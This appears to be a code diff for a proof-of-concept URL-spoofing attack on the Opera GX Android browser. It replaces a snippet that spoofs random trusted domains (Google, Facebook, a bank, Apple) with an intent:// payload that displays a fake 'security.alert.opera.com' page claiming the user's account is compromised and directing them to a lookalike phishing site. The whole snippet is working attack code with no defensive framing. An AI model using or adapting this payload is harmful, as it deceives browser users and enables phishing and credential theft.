@@ -1,12 +1,10 @@
 <script>
-const domains = [
-    'login.opera.com',
-    'accounts.google.com', 
-    'facebook.com',
-    'secure.bank.com',
-    'auth.apple.com'
-];
-
-const randomDomain = domains[Math.floor(Math.random() * domains.length)];
-const dynamicIntent = `intent://vtp.operagx.gg/?url=data://${randomDomain}/,Fake%20Content#Intent;...`;
+const securityAlertIntent = 
+"intent://vtp.operagx.gg/?url=" +
+"data://security.alert.opera.com/," +
+"SECURITY ALERT%0a%0d%0a%0d" +
+"Your Opera account has been compromised.%0a%0d" +
+"Immediate action required:%0a%0d" +
+"https://opera-security-verify.com" +
+"#Intent;scheme=https;category=android.intent.category.BROWSABLE;package=com.opera.gx;S.browser_fallback_url=;end";
 </script>
